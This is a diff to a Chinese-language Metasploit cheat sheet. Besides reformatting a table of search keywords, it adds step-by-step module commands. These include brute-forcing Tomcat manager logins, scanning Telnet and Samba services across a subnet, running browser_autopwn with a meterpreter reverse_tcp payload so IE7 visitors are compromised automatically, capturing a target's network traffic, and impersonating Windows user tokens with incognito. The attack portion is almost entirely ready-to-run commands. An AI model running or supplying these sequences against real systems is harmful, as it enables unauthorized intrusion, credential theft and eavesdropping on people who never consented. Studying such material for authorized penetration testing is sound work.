@@ -60,27 +60,27 @@ search [options] <keywords>
 
 部分keywords：
 
-| 关键字      | 描述                                                         |
-| ----------- | ------------------------------------------------------------ |
-| aka         | 别名                                                         |
-| author      | 作者                                                         |
-| arch        | 架构                                                         |
-| bid         | Bugtraq ID                                                   |
-| cve         | CVE ID                                                       |
-| edb         | Exploit-DB ID                                                |
-| check       | 支持check方法                                                |
-| date        | 发布日期                                                     |
-| description | 描述信息                                                     |
-| full_name   | 全名搜索                                                     |
-| mod_time    | 修改日期                                                     |
-| name        | 描述名称                                                     |
-| path        | 路径                                                         |
-| platform    | 运行平台                                                     |
-| port        | 端口                                                         |
-| rank        | 漏洞严重级别 如good 或使用操作运算符gte400                   |
-| ref         | 模块编号                                                     |
-| reference   | 参考信息                                                     |
-| target      | 目标                                                         |
+| 关键字         | 描述                                                      |
+| ----------- | ------------------------------------------------------- |
+| aka         | 别名                                                      |
+| author      | 作者                                                      |
+| arch        | 架构                                                      |
+| bid         | Bugtraq ID                                              |
+| cve         | CVE ID                                                  |
+| edb         | Exploit-DB ID                                           |
+| check       | 支持check方法                                               |
+| date        | 发布日期                                                    |
+| description | 描述信息                                                    |
+| full_name   | 全名搜索                                                    |
+| mod_time    | 修改日期                                                    |
+| name        | 描述名称                                                    |
+| path        | 路径                                                      |
+| platform    | 运行平台                                                    |
+| port        | 端口                                                      |
+| rank        | 漏洞严重级别 如good 或使用操作运算符gte400                             |
+| ref         | 模块编号                                                    |
+| reference   | 参考信息                                                    |
+| target      | 目标                                                      |
 | type        | 特定类型 exploit payload auxiliary encoder evasion post或nop |
 
 举例：
@@ -195,6 +195,76 @@ sessions #查看所有会话
 sessions -i 1 #回到1号会话
 ```
 
+### Shodan搜索
+
+搜索匹配iomega关键字的所有信息。
+
+```
+use auxiliary/gather/shodan_search
+set SHODAN_APIKEY API密钥
+set QUERY iomega
+run
+```
+
+想更多结果或使用过滤关键字，得交钱。
+
+### Tomcat服务
+
+```
+search tomcat
+use auxiliary/scanner/http/tomcat_mgr_login
+show options
+# set PASS_FILE 设置密码文件 默认自带tomcat_mgr_default_pass.txt
+# set USER_FILE 设置用户名文件 默认自带tomcat_mgr_default_users.txt
+set RHOSTS 192.168.41.142
+set RPORT 8180
+exploit
+```
+
+### Telnet
+
+```
+use auxiliary/scanner/telnet/telnet_version
+show options
+set RHOST 192.168.6.105
+exploit
+```
+
+### Samba服务
+
+```
+use auxiliary/scanner/smb/smb_version
+show options
+set RHOSTS 192.168.6.105
+exploit
+```
+
+扫描网络内开启Samba服务器的所有主机：
+
+```
+use auxiliary/scanner/smb/smb_version
+show options
+set RHOSTS 192.168.6.0/24
+set THREADS 255
+exploit
+```
+
+### 攻击浏览器
+
+用户访问一个Web页面时自动入侵，只支持IE7
+
+```
+search autopwn
+use auxiliary/server/browser_autopwn
+set payload windows/meterpreter/reverse_tcp
+show options
+set LHOST 192.168.41.234
+set URIPATH "filetypes"
+exploit
+```
+
+在客户端IE中访问http://IP地址:8080/filetypes时产生活跃的对话。
+
 ## Meterpreter
 
 ### 基础命令
@@ -247,6 +317,9 @@ execute -s 1 -f cmd
 run post/windows/manage/enable_rdp #远程桌面
 idletime #查看远程用户空闲时常
 rdesktop 192.168.29.143
+
+run packetrecorder -li #列举目标主机网卡
+run packetrecorder -i 1 -l /root/Desktop #捕获网卡编号为1的数据 保存到桌面
 ```
 
 ### 持久后门
@@ -287,8 +360,22 @@ load auto_add_route
 exploit
 ```
 
+### 假冒令牌
+
+在Meterpreter会话中加载incognito模块：
+
+```
+use incognito
+list_tokens -u #列举所有可用令牌
+impersonate_token AA-886OKJM26FSW\\Test #假冒Test用户
+```
+
 ## 免杀
 
 ### Veil Evasion
+
+略。
+
+## msfcli
 
 略。
